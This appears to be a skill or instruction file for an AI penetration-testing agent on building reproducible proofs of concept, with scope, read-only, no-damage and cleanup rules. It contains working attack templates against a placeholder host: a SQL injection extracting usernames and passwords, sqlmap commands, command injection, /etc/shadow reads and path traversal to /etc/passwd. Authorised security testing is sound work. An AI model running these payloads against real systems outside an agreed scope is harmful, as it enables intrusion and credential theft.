---
name: proof-of-concept
description: Build a minimal, reproducible Proof of Concept that demonstrates a vulnerability and captures evidence a reader can re-run
---

# Proof of Concept

The deliverable is not a crash and not a scary claim. It is a short sequence a competent reader can re-run on this exact target and watch the vulnerable behaviour happen. If it needs your private notes to work, it is not finished.

## Before writing anything

A PoC needs a confirmed vector. If you have not yet seen the behaviour — a reflected payload that actually reflected, a quote that actually extracted a row, a file that actually appeared — you do not have a PoC task, you have a hypothesis task. Prove the vector first with the smallest possible request.

## Shape of a good PoC

**One path, one behaviour.** Strip the exploit down until removing anything makes it stop working. Multi-endpoint scanners and chained payloads obscure which part actually matters.

**Deterministic output.** The evidence is the part you will quote in the finding. Make the target print something unambiguous — a specific row, a specific file, a specific marker — not something vague like "it worked". If the proof depends on timing, a race, or chance, it is not reproducible evidence.

**Explicit impact.** The most convincing PoC demonstrates the actual consequence, not just the trigger. Reading one row you own is weak; reading the user table, or writing a file the web server serves, is what shows impact.

## Templates by class

**SQL injection — data proof over boolean proof**

```bash
# Weak: error page proves very little
curl -s "http://TARGET/path?id=1'" 

# Strong: extract a value you can name
curl -s "http://TARGET/path?id=1' UNION SELECT username,password FROM users-- -"
```

**Injection with sqlmap — confirm with data, not just "injectable"**

```bash
sqlmap -u "http://TARGET/path?id=1" --batch --level=3 --risk=2 \
  --technique=BEUSTQ --dbs
# then, only after listing works:
sqlmap -u "http://TARGET/path?id=1" --batch -D <db> --tables
```

**Remote code execution — make the result visible**

```bash
# Weak: no observable effect
curl -s "http://TARGET/x?cmd=id"

# Strong: proof lands somewhere readable and durable
curl -s "http://TARGET/x?cmd=id+>+/tmp/pentest-proof.txt"
curl -s "http://TARGET/read?file=/tmp/pentest-proof.txt"
```

**Privilege escalation — show the level actually reached**

```bash
# Prove the gain, not the attempt
id
sudo -n -l                      # NOPASSWD entries the current user really has
cat /etc/shadow 2>&1 | head -1 # succeeds only if you are genuinely root
```

**File read / path traversal**

```bash
curl -s "http://TARGET/download?file=../../../../etc/passwd"
```

## Capturing evidence

Run the PoC through the `shell` tool so its output becomes numbered evidence in this run. A finding has to cite that evidence id and quote it verbatim — a PoC you never ran cannot be quoted, so the two steps are the same step.

Put the exact command in the finding so a reader can copy it. If the command contains a payload with quotes or shell metacharacters, show the quoting that actually worked, not the one you thought would work.

## Rules

- Test only within the agreed scope. If scope says one host, every request in the PoC goes to that host.
- Prefer read-only proof. Prove access; do not exfiltrate bulk data, delete anything, or leave a shell behind unless the goal specifically requires it.
- No destructive payloads, no ransomware, no persistence. A PoC that damages the target is not a PoC.
- If the PoC does not reproduce on a second run, that is the finding: report it as not reproducible with both attempts as evidence. Do not quietly keep trying until one attempt happens to succeed.
- Clean up what you wrote, or say clearly what you left behind and where.